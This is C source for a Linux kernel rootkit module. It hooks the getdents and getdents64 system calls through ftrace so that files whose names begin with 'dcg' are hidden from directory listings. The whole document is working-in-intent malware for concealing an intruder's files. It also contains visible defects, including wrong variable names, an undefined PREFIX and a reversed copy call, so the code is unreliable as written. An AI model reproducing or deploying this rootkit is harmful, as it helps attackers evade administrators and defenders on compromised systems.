#include<linux/module.h>
#include "libs/ftrace_helper.h"

#define MAGIC "dcg"

static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
asmlinkage int hook_getdents64(const struct pt_regs *regs)
{
  int fd = (int)pt_regs->di;
  struct linux_dirent64 __user *dirent = (struct linux_dirent *)pt_regs->si;
  struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;

  unsigned long offset = 0;

  int ret = orig_getdents64(pt_regs);
  dirent_ker = kzalloc(ret, GFP_KERNEL);

  if( (ret <= 0) || (dirent_ker == NULL))
  	return ret;

  long err = copy_from_user(dirent_key, dirent, ret);
  if (err)
  	goto done;

  while (offset < ret)
  {
  	current_dir = (void *)dirent_ker + offset;

  	if (memcmp(MAGIC, current_dir->d_name, strlen(MAGIC)) == 0)
  	{
  	  if (current_dir == dirent_ker)
      {
  	    ret -= current_dir->d_reclen;
  	    memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
  	    continue;
  	  }

  	  previous_dir->d_reclen += current_dir->d_reclen;
  	}

  	else
  	{
  		previous_dir = current_dir;
  	}

  	offset += current_dir->d_reclen;
  }

  error = copy_from_user(dirent, dirent_key, ret);
  if (error)
  	goto done;

done:
  kfree(dirent_ker);
  return ret;

}

static asmlinkage long (*orig_getdents)(const struct pt_regs *regs)
asmlinkage int hook_getdents(const struct pt_regs *regs)
{
    struct linux_dirent {
        unsigned long d_ino;
        unsigned long d_off;
        unsigned short d_reclen;
        char d_name[];
    };

    int fd = regs->di;
    struct linux_dirent *dirent = (struct linux_dirent *)regs->si;
    

    long error;

    struct linux_dirent *current_dir, *dirent_ker, *previous_dir = NULL;
    
    unsigned long offset = 0;

    int ret = orig_getdents(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if ( (ret <= 0) || (dirent_ker == NULL) )
        return ret;

    error = copy_from_user(dirent_ker, dirent, ret);
    if (error)
        goto done;

    while (offset < ret)
    {
        current_dir = (void *)dirent_ker + offset;

        if ( memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0)
        {
            if ( current_dir == dirent_ker )
            {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }

            previous_dir->d_reclen += current_dir->d_reclen;
        }
        else
        {
            previous_dir = current_dir;
        }

        offset += current_dir->d_reclen;
    }

    error = copy_to_user(dirent, dirent_ker, ret);
    if (error)
        goto done;

done:
  kfree(dirent_ker);
  return ret;

}

static struct ftrace_hook hooks[] = {HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64), 
				     HOOK("__x64_sys_getdents", hook_getdents, &orig_getdents),};

static int __init rootkit_init(void)
{
  fh_install_hooks(hooks, ARRAY_SIZE(hooks));
  return 0;
}

static void __exit rootkit_destroy(void)
{
  fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}

module_init(rootkit_init);
module_exit(rootkit_destroy);
